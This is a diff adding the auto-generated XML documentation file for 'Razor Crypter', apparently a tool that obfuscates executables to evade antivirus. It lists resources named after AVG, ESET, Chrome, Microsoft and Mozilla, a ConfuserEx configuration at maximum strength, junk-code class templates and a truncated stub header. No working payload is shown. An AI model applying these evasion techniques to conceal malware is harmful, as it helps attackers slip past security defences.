@@ -1,0 +1,152 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Razor Crypter
+</name>
+</assembly>
+<members>
+<member name="T:Razor_Crypter.My.Resources.Resources">
+<summary>
+  Eine stark typisierte Ressourcenklasse zum Suchen von lokalisierten Zeichenfolgen usw.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.ResourceManager">
+<summary>
+  Gibt die zwischengespeicherte ResourceManager-Instanz zurück, die von dieser Klasse verwendet wird.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Culture">
+<summary>
+  Überschreibt die CurrentUICulture-Eigenschaft des aktuellen Threads für alle
+  Ressourcenzuordnungen, die diese stark typisierte Ressourcenklasse verwenden.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources._String">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die namespace %1%
+{
+    class %2%
+    {
+    }
+}
+ ähnelt.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Application">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die public interface %1%
+{
+    string %5% { get; set; }
+    string %6% { get; set; }
+    string %7% { get; set; }
+    string %8% { get; set; }
+}
+public static class %10%
+{
+    private static %1% %3%;
+    public static void %4%(%1% %9%)
+    {
+        %3% = %9%;
+    }
+    public static string %5%
+    {
+        get { return %3%.%5%; }
+        set { %3%.%5% = value; }
+    }
+} ähnelt.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.AVG">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.config">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die &lt;project outputDir=&quot;%path%&quot; baseDir=&quot;%basedir%&quot; xmlns=&quot;http://confuser.codeplex.com&quot;&gt;
+  &lt;rule pattern=&quot;true&quot; preset=&quot;maximum&quot; /&gt;
+  &lt;module path=&quot;%stub%&quot;&gt;
+    &lt;rule pattern=&quot;true&quot; preset=&quot;maximum&quot; /&gt;
+  &lt;/module&gt;
+&lt;/project&gt; ähnelt.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.ConfuserEx">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.ESET">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.File">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die 	class %2%
+	{
+		public int %3%;
+		public String %4%; 
+		public String %9%;
+		public void %12%() {
+			String %8% = &quot;%7%&quot; + %9% + &quot;%5%&quot; + %4% + &quot;%6%&quot; + %3%;
+ 
+			System.Console.WriteLine (%8%);
+		}
+		public void %10%(String %9%){
+			this.%9% =  %9%;
+		}
+ 
+		public String %11%() {
+			return %9%;
+		}
+		struct %13%
+{
+            public int %14%;
+            public bool %15%;
+            public double %16%;
+   };
+}
+ ähnelt.
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Google_Chrome">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Microsoft_Corporation">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Mozilla">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:Razor_Crypter.My.Resources.Resources.Razor">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die using System;
+using System.IO;
+using System.IO.Compression;
+using Microsoft.VisualBasic;
+using System.Threading;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Drawing;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using Microsoft.VisualBasic.CompilerServices;
+using System.Collections.Generic;
+[assembly: AssemblyT [Rest der Zeichenfolge wurde abgeschnitten]&quot;; ähnelt.
+</summary>
+</member>
+</members>
+</doc>
